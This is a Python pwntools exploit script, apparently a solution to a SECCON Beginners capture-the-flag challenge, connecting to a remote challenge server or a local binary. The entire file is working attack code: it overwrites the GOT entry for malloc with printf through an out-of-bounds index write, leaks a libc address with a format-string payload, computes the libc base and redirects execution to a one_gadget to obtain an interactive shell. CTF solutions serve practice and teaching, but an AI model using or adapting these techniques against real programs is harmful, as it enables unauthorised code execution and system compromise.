#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./chall')
else:
    s = remote('es.quals.beginners.seccon.jp', 9003)

def write(index, value):
    s.sendlineafter('index: ', str(index))
    s.sendlineafter('value: ', value)

elf = ELF('./chall')
libc = ELF('./libc-2.27.so')

write(-2, str(elf.got['malloc']))

write(0, 'A' * 8 + p64(elf.symbols['printf']))
write(0, '%3$p')

libc_base = int(s.recvline(False), 0x10) - 0x110081
log.info('libc base: %#x' % libc_base)

one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
write(0, 'A' * 8 + p64(libc_base + one_gadgets[2]))

s.interactive()
